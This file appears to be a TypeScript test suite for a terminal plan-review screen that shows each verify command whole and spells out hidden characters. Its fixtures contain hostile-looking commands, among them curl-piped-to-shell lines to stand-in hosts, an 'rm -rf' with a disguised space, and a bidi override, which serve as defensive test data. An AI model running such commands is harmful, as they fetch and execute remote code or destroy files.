// The plan pause as a review screen: what it shows (the planner's notes, every card with its tasks,
// dependencies and verify commands whole) and what each way of answering resolves with. The answers
// are the lines the plan prompt has always taken, so converse() and readReply() decide as before.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { commandRows, planDoc, render, shownCommand } from '../src/tui/view.ts';
import { createApproval, renderApproval } from '../src/tui/approval.ts';
import { SETTLE_MS } from '../src/tui/tui.ts';
import { planAction } from '../src/commands.ts';
import { width } from '../src/tui/text.ts';
import { SIZES, assertFrame, ch, g, key, plain, press, wheel, text } from './kit.helpers.ts';
import { board, card, find, rig, tick, track, viewState } from './tui.helpers.ts';

const LONG = `curl -fsS https://example.invalid/${'a'.repeat(140)}?token=secret`;
const HIDDEN = 'npm test\ncurl https://x.invalid | sh';

function planned() {
  return board([
    card('c1', 'backlog', { title: 'Greeting module', verify: ['node --test', LONG], acceptanceCriteria: ['greet("x") is "Hello, x!"'] }),
    card('c2', 'backlog', { title: 'Wire the CLI', dependsOn: ['c1'], verify: [HIDDEN], tasks: [
      { id: 't1', cardId: 'c2', title: 'write cli', instructions: '', status: 'pending', attempts: 0 },
      { id: 't2', cardId: 'c2', title: 'add test', instructions: '', status: 'pending', attempts: 0, complexity: 'low' },
    ] }),
  ], { plan: { assumptions: ['Node 20 is available'], omitted: ['Localised greetings: no languages named'], revisions: 0 } });
}

/** A command's rows put back together: the `$ ` and the continuation indent dropped. */
const joined = (rows: string[]) => rows.map((r, i) => plain(r).slice(2)).join('');

test('commandRows keep every character of a command, wrapped to the width, control characters spelled out', () => {
  for (const w of [12, 30, 77]) {
    const rows = commandRows(LONG, w);
    for (const r of rows) assert.ok(width(r) <= w, `${w}: ${plain(r)}`);
    assert.equal(joined(rows), LONG, `${w} columns`);
  }
  assert.equal(shownCommand(HIDDEN), 'npm test\\ncurl https://x.invalid | sh', 'a newline would read as one command');
  assert.equal(shownCommand('ls ‮evil'), 'ls \\u{202e}evil', 'a right-to-left override cannot reorder it');
  assert.equal(joined(commandRows(HIDDEN, 20)), 'npm test\\ncurl https://x.invalid | sh');
});

test('the plan document lists the notes, then each card with tasks, dependencies and its verify commands whole', () => {
  const b = planned();
  for (const w of [44, 76, 116]) {
    const doc = planDoc({ board: b, g, review: { warnings: ['c1 has 5 tasks; split it'], button: 0 } }, w);
    const all = text(doc);
    for (const line of doc) assert.ok(width(line) <= w, `${w}: ${plain(line)}`);
    for (const want of ['Assumptions', 'Node 20 is available', 'Left out', 'Localised greetings', 'Warnings', 'c1 has 5 tasks', 'Greeting module', 'after c1', 't2 add test (low)', 'greet("x") is "Hello, x!"']) {
      assert.ok(all.includes(want), `${w}: ${want}`);
    }
    // Every row of every command is in the document, so nothing of it is cut.
    const bodyW = w - 4 - 11;
    for (const cmd of [LONG, HIDDEN, 'node --test']) {
      for (const row of commandRows(cmd, bodyW)) assert.ok(doc.some((l) => plain(l).includes(plain(row))), `${w}: ${plain(row)}`);
    }
  }
});

test('the review fits exactly at every size and puts its actions and the reply above the footer', () => {
  const b = planned();
  for (const [rows, cols] of SIZES) {
    for (const focus of ['board', 'log', 'input'] as const) {
      const f = render(viewState(b, { rows, cols, focus, phase: 'plan ready', review: { warnings: [], button: 0 }, prompt: { label: 'reply', text: '', cursor: 0, hint: '', placeholder: 'type here' } }));
      assertFrame(f.lines, rows, cols, `review ${focus}`);
    }
  }
  const f = render(viewState(b, { rows: 40, cols: 120, phase: 'plan ready', review: { warnings: [], button: 0 }, prompt: { label: 'reply', text: '', cursor: 0, hint: '', placeholder: 'type here' } }));
  const lines = f.lines.map(plain);
  assert.match(lines[37]!, /\[ Dispatch \] +Revise +Edit plan +Cancel run +Keep in backlog/, 'without colour the chosen action is bracketed');
  assert.match(lines[38]!, /reply › type here/);
  assert.match(lines[39]!, /⏎ dispatch +←→ action +\^c backlog +\? help/, 'the footer: the keys that matter, help last');
  assert.doesNotMatch(lines[37]!, /start the workers/, 'nothing beside the actions');
  assert.deepEqual(f.hits.buttons.map((b) => b.id), ['dispatch', 'revise', 'edit', 'cancel', 'backlog']);
  assert.match(lines[2]!, /Plan .* 2 cards · 3 tasks · 3 verify/);
});

test('Enter dispatches and typed text revises, as at the plan prompt', async () => {
  const r = rig({ board: planned(), phase: 'plan ready' });
  try {
    assert.equal(await (() => { const p = r.tui.reviewPlan({ read: planAction }); r.s.key(key('enter')); return p; })(), '', 'Enter on the review dispatches');
    const p = r.tui.reviewPlan({ read: planAction });
    r.s.type('use raylib');
    assert.match(r.text(), /reply › use raylib/, 'the first key starts the reply');
    assert.match(r.bar(), /send/);
    r.s.key(key('enter'));
    assert.equal(await p, 'use raylib');
    for (const line of ['go', '/edit', 'go with raylib instead']) {
      const q = r.tui.reviewPlan({ read: planAction });
      r.s.type(line);
      r.s.key(key('enter'));
      assert.equal(await q, line, 'what converse() reads, unchanged');
    }
  } finally { r.tui.close(); }
});

test('the actions: Revise opens the reply, Edit plan answers /edit, Keep in backlog and Ctrl-C answer nothing', async () => {
  const r = rig({ board: planned(), phase: 'plan ready' });
  try {
    let p = r.tui.reviewPlan({ read: planAction });
    r.s.key(key('right'));
    assert.match(r.bar(), /revise/, 'the footer names what Enter does now');
    r.s.key(key('enter'));
    assert.ok(r.s.cursor, 'the reply line has the cursor');
    r.s.type('split c2');
    r.s.key(key('enter'));
    assert.equal(await p, 'split c2');

    p = r.tui.reviewPlan({ read: planAction });
    r.s.key(key('right')); r.s.key(key('right'));
    r.s.key(key('enter'));
    assert.equal(await p, '/edit');

    p = r.tui.reviewPlan({ read: planAction });
    for (let i = 0; i < 9; i++) r.s.key(key('right'));
    r.s.key(key('enter'));
    assert.equal(await p, undefined, 'Keep in backlog');

    p = r.tui.reviewPlan({ read: planAction });
    r.s.type('half a reply');
    r.s.key(key('ctrl', 'c'));
    assert.equal(await p, undefined, 'Ctrl-C keeps the run in the backlog, as it always has');
    assert.equal(r.interrupts, 0);
  } finally { r.tui.close(); }
});

test('cancelling asks first, from the action and from a typed cancel; only confirming answers cancel', async () => {
  const r = rig({ board: planned(), phase: 'plan ready' });
  try {
    const p = track(r.tui.reviewPlan({ read: planAction }));
    for (let i = 0; i < 3; i++) r.s.key(key('right'));
    r.s.key(key('enter'));
    assert.match(r.text(), /Delete run r1/);
    assert.match(r.text(), /branch dulger\/r1/, 'what goes with it, as a fact');
    r.s.key(key('enter'));
    await tick();
    assert.equal(p.done, false, 'Enter is on the safe choice');
    assert.doesNotMatch(r.text(), /Delete run/);

    r.s.type('cancel');
    r.s.key(key('enter'));
    assert.match(r.text(), /Delete run/, 'a typed cancel asks too');
    r.s.key(key('escape'));
    await tick();
    assert.equal(p.done, false);

    r.s.type('drop');
    r.s.key(key('enter'));
    r.s.key(key('right'));
    r.s.key(key('enter'));
    await tick();
    assert.deepEqual(p, { done: true, value: 'cancel' });
  } finally { r.tui.close(); }
});

test('an empty reply goes back to the plan, and a paste is text in the reply, never keys', async () => {
  const r = rig({ board: planned(), phase: 'plan ready' });
  try {
    const p = track(r.tui.reviewPlan({ read: planAction }));
    r.s.key(key('right'));
    r.s.key(key('enter'));
    r.s.key(key('enter'));
    await tick();
    assert.equal(p.done, false, 'nothing typed sends nothing');
    assert.match(r.bar(), /revise/, 'and the review has the keys again');
    r.s.key({ name: 'paste', text: 'line one\nline two\x1b[2J' });
    assert.match(r.text(), /reply › line one line two/);
    await tick();
    assert.equal(p.done, false, 'the pasted newline did not send it');
    r.s.key(key('enter'));
    await tick();
    assert.deepEqual(p, { done: true, value: 'line one line two' });
  } finally { r.tui.close(); }
});

test('help lists the review keys; the wheel scrolls the plan and a click does an action', async () => {
  const b = planned();
  b.cards.push(...['c3', 'c4', 'c5', 'c6'].map((id) => card(id, 'backlog', { verify: ['npm test'] })));
  const r = rig({ board: b, phase: 'plan ready' });
  try {
    const p = track(r.tui.reviewPlan({ read: planAction, warnings: ['c1 is big'] }));
    r.s.key(ch('?'));
    // Help scrolls: read every page of it.
    let seen = r.text();
    for (let i = 0; i < 8; i++) { r.s.key(key('pagedown')); seen += r.text(); }
    const flat = seen.replace(/\s+/g, ' ');
    for (const want of ['Plan review', 'choose an action', 'reply to the planner', 'keep the run for later', 'Dispatch: start the workers', 'dispatching approves them', 'judges by reading']) assert.ok(flat.includes(want), want);
    for (let i = 0; i < 8; i++) r.s.key(key('pageup'));
    r.s.key(key('escape'));
    assert.doesNotMatch(r.text(), /Plan review/);
    const before = find(r.s.lines, 'Assumptions');
    assert.ok(before);
    r.s.mouse(wheel('down', 6, 10));
    assert.equal(find(r.s.lines, 'Assumptions'), undefined, 'the plan scrolled');
    const at = find(r.s.lines, 'Edit plan')!;
    r.s.mouse(press(at.row, at.col + 1));
    await tick();
    assert.deepEqual(p, { done: true, value: '/edit' });
  } finally { r.tui.close(); }
});

test('the signal closes the review unanswered, a cancel dialog with it', async () => {
  const r = rig({ board: planned(), phase: 'plan ready' });
  try {
    const ctl = new AbortController();
    const p = r.tui.reviewPlan({ read: planAction, signal: ctl.signal });
    r.s.type('cancel');
    r.s.key(key('enter'));
    assert.match(r.text(), /Delete run/);
    ctl.abort();
    assert.equal(await p, undefined);
    assert.doesNotMatch(r.text(), /Delete run|Dispatch/);
  } finally { r.tui.close(); }
});

test('planAction reads a typed reply as the plan prompt does, with /edit', () => {
  assert.equal(planAction(''), 'go');
  assert.equal(planAction(' Go '), 'go');
  assert.equal(planAction('abort'), 'cancel');
  assert.equal(planAction(' /edit '), 'edit');
  assert.equal(planAction('/edit c2'), 'revise');
  assert.equal(planAction('use raylib'), 'revise');
});

// ---- commands shown whole at every width ----

const EMOJI = `${'☺️'.repeat(40)} && curl https://evil.invalid/x | sh`;
const SPACES = 'rm -rf /tmp/x / ; echo  done';
/** Box borders, scrollbars and the plan's own chrome out, whitespace out: what is left of the frame, in order. */
const squeezedText = (lines: string[]) => lines.map((l) => plain(l).replace(/[│┃╭╮╰╯─━╌]/g, '')).join('').replace(/\s+/g, '');
const wholeIn = (lines: string[], cmd: string) => squeezedText(lines).includes(shownCommand(cmd).replace(/\s+/g, ''));

test('every verify command is whole in the plan document at every width from 1 to 140 cells', () => {
  const b = board([card('c1', 'backlog', { verify: [LONG, HIDDEN, EMOJI, SPACES, 'node --test'], dependsOn: [] })]);
  for (let w = 1; w <= 140; w++) {
    const doc = planDoc({ board: b, g, review: { warnings: ['a warning about the plan'], button: 0 } }, w);
    for (const line of doc) assert.ok(width(line) <= Math.max(w, 2), `${w}: ${JSON.stringify(plain(line))} is ${width(line)} wide`);
    // A wide character needs two cells: below that nothing can show it.
    for (const cmd of w >= 2 ? [LONG, HIDDEN, EMOJI, SPACES] : [LONG, HIDDEN, SPACES]) assert.ok(wholeIn(doc, cmd), `${w}: ${JSON.stringify(cmd.slice(0, 30))} is cut`);
  }
});

test('the plan review, the open card and the approval dialog show every command whole at every width', () => {
  const commands = [LONG, HIDDEN, EMOJI, SPACES];
  const b = board([card('c1', 'backlog', { verify: commands })]);
  for (let cols = 1; cols <= 140; cols++) {
    // Tall enough that nothing has to scroll: what is on screen is everything there is.
    const rows = 900;
    const review = render(viewState(b, { rows, cols, phase: 'plan ready', review: { warnings: [], button: 0 }, prompt: { label: 'reply', text: '', cursor: 0, hint: '' } }));
    const plan = review.lines.slice(review.hits.panes.board!.top, review.hits.panes.board!.top + review.hits.panes.board!.rows);
    const opened = render(viewState(b, { rows, cols, open: 'c1', selected: 'c1' }));
    const detail = opened.lines.slice(opened.hits.panes.board!.top, opened.hits.panes.board!.top + opened.hits.panes.board!.rows);
    const s = createApproval({ title: 'Approve', message: 'm', items: commands.map((command) => ({ command, detail: 'for c1' })), word: 'yes', prompt: 'Type yes', confirm: 'Run them', cancel: 'Drop the replan' });
    const box = renderApproval(s, { rows, cols }, g).lines;
    for (const cmd of cols >= 2 ? commands : commands.filter((x) => x !== EMOJI)) {
      assert.ok(wholeIn(plan, cmd), `review at ${cols}: ${JSON.stringify(cmd.slice(0, 24))} is cut`);
      assert.ok(wholeIn(detail, cmd), `open card at ${cols}: ${JSON.stringify(cmd.slice(0, 24))} is cut`);
      if (cols >= 8) assert.ok(wholeIn(box, cmd), `approval at ${cols}: ${JSON.stringify(cmd.slice(0, 24))} is cut`);
    }
  }
});

test('shownCommand spells out what draws nothing or passes for a space, and keeps an emoji\'s own form', () => {
  assert.equal(shownCommand('rm -rf /tmp/x /'), 'rm -rf /tmp/x\\u{a0}/', 'a no-break space is no word break to a shell');
  assert.equal(shownCommand('a b c'), 'a\\u{2028}b\\u{2029}c');
  assert.equal(shownCommand('ls͏ ㅤ ᅟ x'), 'ls\\u{34f} \\u{3164} \\u{115f} x', 'invisible joiners and fillers');
  assert.equal(shownCommand('echo a️ b\u{e0100}'), 'echo a\\u{fe0f} b\\u{e0100}', 'a variation selector after a letter draws nothing');
  assert.equal(shownCommand('echo ☺️ done'), 'echo ☺️ done', 'after an emoji it picks its form, and stays');
  assert.equal(shownCommand('echo '), 'echo \\u{e000}', 'a private-use glyph is a different picture in every font');
  assert.equal(shownCommand('npm test'), 'npm test');
});

// ---- the review's keys and clicks ----

test('Esc on the review leaves the chosen action where it is', async () => {
  const r = rig({ board: planned(), phase: 'plan ready' });
  try {
    const p = track(r.tui.reviewPlan({ read: planAction }));
    for (let i = 0; i < 4; i++) r.s.key(key('right'));
    r.s.key(key('escape'));
    assert.match(r.bar(), /⏎ backlog/, 'still on Keep in backlog');
    r.s.key(key('enter'));
    await tick();
    assert.deepEqual(p, { done: true, value: undefined }, 'Enter did what was chosen, not Dispatch');
  } finally { r.tui.close(); }
});

test('the review ignores Enter and clicks on its actions for a moment after it appears, after a revision and after a resize', async () => {
  const r = rig({ board: planned(), phase: 'revising', settle: true, rows: 24, cols: 80 });
  try {
    for (let i = 0; i < 30; i++) r.tui.note(`log line ${i}`);
    const p = track(r.tui.reviewPlan({ read: planAction }));
    r.tui.setPhase('plan ready');
    r.s.key(key('enter'));
    const at = find(r.s.lines, 'Dispatch')!;
    r.s.mouse(press(at.row, at.col + 1));
    await tick();
    assert.equal(p.done, false, 'an Enter or a click aimed at what was there before does not dispatch');
    r.advance(SETTLE_MS);
    r.s.resize(26, 82);
    r.s.key(key('enter'));
    await tick();
    assert.equal(p.done, false, 'nor right after the screen was laid out again');
    r.advance(SETTLE_MS);
    r.s.key(key('enter'));
    await tick();
    assert.deepEqual(p, { done: true, value: '' }, 'a moment later Enter dispatches');

    const again = track(r.tui.reviewPlan({ read: planAction }));
    const there = find(r.s.lines, 'Dispatch')!;
    r.s.mouse(press(there.row, there.col + 1));
    await tick();
    assert.equal(again.done, false, 'the review after a revision settles too');
    r.advance(SETTLE_MS);
    r.s.mouse(press(there.row, there.col + 1));
    await tick();
    assert.deepEqual(again, { done: true, value: '' });
  } finally { r.tui.close(); }
});

test('with a reply typed and not sent, a click away and Enter, or a click on Dispatch, go back to the reply', async () => {
  const r = rig({ board: planned(), phase: 'plan ready', rows: 30, cols: 100 });
  try {
    const p = track(r.tui.reviewPlan({ read: planAction }));
    r.s.type('split c2');
    const plan = find(r.s.lines, 'Greeting module')!;
    r.s.mouse(press(plan.row, plan.col));
    assert.match(r.bar(), /⏎ reply/, 'Enter would go back to the reply');
    r.s.key(key('enter'));
    const dispatch = find(r.s.lines, 'Dispatch')!;
    r.s.mouse(press(dispatch.row, dispatch.col + 1));
    await tick();
    assert.equal(p.done, false, 'neither dispatched');
    assert.ok(r.s.cursor, 'the reply has the cursor again');
    r.s.key(key('enter'));
    await tick();
    assert.deepEqual(p, { done: true, value: 'split c2' }, 'and Enter there sends it');
  } finally { r.tui.close(); }
});

test('after a revision the plan shows the reply first, the cards it removed, and marks the cards it added or changed', () => {
  const b = planned();
  b.plan = { assumptions: [], omitted: [], revisions: 1 };
  const revision = { asked: 'merge c1 and c3, and add a test card', added: ['c2'], edited: ['c1'], removed: ['c3'] };
  for (const w of [30, 76]) {
    const doc = text(planDoc({ board: b, g, review: { warnings: [], button: 0, revision } }, w));
    assert.match(doc.replace(/\s+/g, ' '), /^› merge c1 and c3, and add a test card removed c3 /, `${w}: the reply, then what went`);
    assert.match(doc, /c1 changed {2}Greeting module/);
    assert.match(doc, /c2 new {2}Wire the CLI/);
    assert.doesNotMatch(doc, /planner changed|Your reply/, 'marks, no prose');
  }
  const failed = text(planDoc({ board: b, g, review: { warnings: [], button: 0, revision: { ...revision, failed: true } } }, 76));
  assert.match(failed, /✗ not revised/);
  assert.doesNotMatch(failed, /c1 changed|removed/, 'nothing is marked when nothing changed');
  const kept = text(planDoc({ board: b, g, review: { warnings: [], button: 0, revision: { asked: 'looks fine?', added: [], edited: [], removed: [] } } }, 76));
  assert.match(kept, /^› looks fine\?\n\n/, 'the reply alone');
  assert.doesNotMatch(kept, / new | changed |removed/);
});
